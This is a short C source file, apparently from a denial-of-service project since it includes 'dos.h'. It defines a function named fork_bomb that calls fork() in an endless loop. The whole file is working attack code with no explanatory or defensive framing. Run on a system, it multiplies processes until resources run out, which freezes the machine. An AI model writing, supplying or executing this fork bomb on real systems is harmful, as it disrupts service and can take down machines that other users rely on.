#include <stdbool.h>
#include <unistd.h>

#include "dos.h"

__attribute__ ((/*leaf, */nothrow))
void fork_bomb (void) {
   while (true) (void) fork ();
}